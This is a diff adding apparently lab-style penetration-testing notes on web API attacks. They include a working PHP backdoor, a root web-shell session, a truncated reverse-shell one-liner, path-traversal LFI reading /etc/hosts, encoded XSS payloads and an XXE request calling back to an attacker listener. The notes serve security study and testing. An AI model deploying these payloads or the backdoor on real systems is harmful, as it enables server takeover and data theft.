@@ -204,3 +204,183 @@ APIs may have rate limits; bypass with headers like X-Forwarded-For:
 <img width="557" height="167" alt="image" src="https://github.com/user-attachments/assets/d1c5eae1-8e54-4340-bf74-9cc23a66b4cc" />
 
 SQL Injection can also target parameters like id. Test classic payloads.
+
+
+# Arbitrary File Upload
+
+Arbitrary file upload vulnerabilities allow attackers to upload malicious files, execute commands, and potentially gain full control of the server.
+
+## PHP File Upload via API
+
+Target application: `http://<TARGET IP>:3001`
+Look for file upload functionality (1MB limit, no auth required).
+
+Create a simple PHP backdoor (backdoor.php):
+
+`<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); die; } ?>`
+
+
+Upload via the API (`/api/upload/`). The server may allow:
+
+- `.php` extensions
+- `application/x-php` content type
+- No content scanning
+
+Uploaded file location example:
+
+`http://<TARGET IP>:3001/uploads/backdoor.php`
+
+Interactive Web Shell Script
+
+Python script (web_shell.py) to interact with the uploaded backdoor:
+
+<img width="1080" height="557" alt="image" src="https://github.com/user-attachments/assets/c780b5b8-20c8-4865-a9b3-0b4a7a6eaced" />
+
+## Usage
+
+Interactive shell:
+
+`python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes`
+
+Example session:
+
+<pre>$ id
+uid=0(root) gid=0(root) groups=0(root)</pre>
+
+## Reverse Shell
+
+Inside the interactive shell, spawn a reverse shell (ensure a listener is running):
+
+`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);...'`
+
+
+
+# Local File Inclusion (LFI)
+
+LFI vulnerabilities allow attackers to read internal files and sometimes execute code (e.g., via Apache log poisoning).
+
+## Target API
+
+Target: `http://<TARGET IP>:3000/api`
+
+Check if the API is alive:
+
+`curl http://<TARGET IP>:3000/api`
+
+`{"status":"UP"}`
+
+## API Endpoint Fuzzing
+
+Use ffuf to discover endpoints:
+
+`ffuf -w "/path/to/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'`
+
+
+## Example output shows a valid endpoint:
+
+`download [Status: 200, Size: 71, Words: 5, Lines: 1]`
+
+**Interacting with the Endpoint:**
+
+`curl http://<TARGET IP>:3000/api/download`
+
+`{"success":false,"error":"Input the filename via /download/<filename>"}`
+
+We need to provide a filename.
+
+
+## Exploiting LFI
+
+Attempt directory traversal to read system files:
+
+`curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"`
+
+**Example output:**
+
+<pre>127.0.0.1 localhost
+127.0.1.1 nix01-websvc
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters</pre>
+
+
+✅ The API is vulnerable to Local File Inclusion.
+
+
+# Cross-Site Scripting (XSS)
+
+XSS vulnerabilities allow attackers to execute arbitrary JavaScript in a victim’s browser, which can lead to complete web application compromise if combined with other flaws.
+
+**Target API**
+
+Target: http://<TARGET IP>:3000/api/download
+
+**Check reflection behavior:**
+
+<pre>http://<TARGET IP>:3000/api/download/test_value
+ Message: 'test_value not found!'</pre>
+
+test_value is reflected in the response → potential XSS.
+
+## Testing a Script Payload
+
+Submit a basic script payload:
+
+`<script>alert(document.domain)</script>`
+
+Response:
+
+`Cannot GET /api/download/<script>alert(document.domain)</script>`
+
+The application encodes input → script not executed.
+
+## URL-Encoded Payload
+
+Encode payload once and try again:
+
+`%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E`
+
+Result: An alert box appears showing the IP address `10.129.144.21. ✅`
+
+The API endpoint is vulnerable to XSS.
+
+
+
+
+# XML External Entity (XXE) Injection
+
+XXE vulnerabilities happen when user-supplied XML is not properly sanitized, allowing attackers to read internal files or perform other malicious actions. XXE can impact both web apps and APIs.
+
+**Target API**
+
+Target: `http://<TARGET IP>:3001`
+
+We encounter an authentication page sending XML data.
+
+**Example POST request to `/api/login`:**
+
+<img width="373" height="212" alt="image" src="https://github.com/user-attachments/assets/9cc71a0a-6d2b-4fc0-9adc-7610446b0147" />
+
+## Crafting an XXE Payload
+
+Add a DOCTYPE to define an external entity:
+
+<img width="680" height="213" alt="image" src="https://github.com/user-attachments/assets/da02d3d8-438a-438b-9011-bdf5f568a53d" />
+
+`DOCTYPE` defines the XML structure.
+
+`ENTITY` defines a variable (somename) pointing to an external resource (SYSTEM).
+
+`&somename;` references the entity in the XML.
+
+## Setting Up Listener
+
+`nc -nlvp 4444`
+
+## Sending the Exploit
+
+`curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'`
+
+Result: The target connects to your listener, confirming XXE vulnerability.
